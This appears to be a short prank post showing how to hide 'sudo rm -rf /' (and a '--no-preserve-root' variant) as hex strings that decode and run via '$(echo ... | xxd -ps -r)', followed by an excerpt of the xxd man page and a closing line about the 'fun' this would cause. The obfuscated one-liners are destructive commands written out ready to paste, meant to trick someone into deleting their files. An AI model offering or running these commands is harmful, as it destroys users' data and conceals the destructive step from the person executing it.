$(echo 7375646f20726d202d72662f | xxd -ps -r)

Basically, this very powerful line includes a " sudo rm -rf/ "
This means that, the user experiencing this, will got his computer deleted.

There is another version available, but this one only works on linux .
sudo rm -rf --no-preserve-root

which is in HEX:
7375646f20726d202d7266202d2d6e6f2d70726573657276652d726f6f74

So...
$(echo 7375646f20726d202d7266202d2d6e6f2d70726573657276652d726f6f74 | xxd -ps -r)

 -p | -ps | -postscript | -plain
              output  in  postscript  continuous  hexdump style. Also known as
              plain hexdump style.

-r | -revert
          reverse operation: convert (or patch) hexdump into  binary.   If
          not  writing  to stdout, xxd writes into its output file without
          truncating it. Use the combination -r -p to read plain hexadeci-
          mal dumps without line number information and without a particu-
          lar column layout. Additional  Whitespace  and  line-breaks  are
          allowed anywhere.
          
          
NOW, IMAGINE THE FUN WE WOULD HAVE ... =)
